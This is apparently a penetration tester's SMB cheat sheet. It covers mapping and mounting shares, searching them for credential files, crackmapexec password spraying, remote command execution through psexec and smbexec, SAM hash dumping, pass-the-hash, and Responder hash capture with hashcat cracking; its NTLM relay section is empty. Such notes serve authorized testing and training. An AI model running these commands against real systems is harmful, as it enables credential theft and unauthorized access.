### CMD
###### Map a drive
```
net use n: \\<ip>\<dir> /user:<username> <password>
```
###### Search files by name
```
dir n:\*cred* /s /b
```
###### Search Files by content
```
findstr /s /i cred n:\*.*
```
### Powershell
###### Map a drive
```
Get-ChildItem \\<IP>\<SHARE>\
New-PSDrive -Name "N" -Root "\\<IP>\<SHARE>" -PSProvider "FileSystem"
New-PSDrive -Name "N" -Root "\\<IP>\<SHARE>" -PSProvider "FileSystem" -Credential <CRED>
```
###### PSCredential
```
$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
```
Search files by name
```
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```
Search files by content
```
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```
### Linux
###### Mounting Shares
```
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=<USER>,password=<PASS>,domain=<DOMAIN> //<IP>/<SHARE> /mnt/<SHARE>
#or
mount -t cifs //<IP>/<SHARE> /mnt/<SHARE> -o credentials=/path/credentialfile
	credentialfile:
		username=<USER>
		password=<PASS>
		domain=<DOMAIN>
```
Tools
Connecting
```
smbclient -N -L //<IP>
smbmap -H <IP> --download "\path\to\file"
smbmap -H <IP> --upload test.txt "/path/to/file"
enum4linux-ng <IP> -A -C
crackmapexec smb <IP> -u <USER_LIST> -p <PASS> --local-auth --continue-on-success
```
Execution
```
impacket-psexec <USER>:'<PASS>'@<IP> 
crackmapexec smb <IP> -u <USER> -p '<PASS>' -x '<COMMAND>' --exec-method smbexec
```
User Enumeration
```
crackmapexec smb <IP/CIDR> -u <USER> -p '<PASS>' --loggedon-users
```
SAM
```
crackmapexec smb <IP> -u <USER> -p '<PASS>' --sam
samrdump.py <IP>
```
PTH
```
crackmapexec smb <IP> -u <USER> -H <HASH>
```
Responder
```
responder -I <INTERFACE>
hashcat -m 5600 <HASH>
```
NTLM Relay
```

```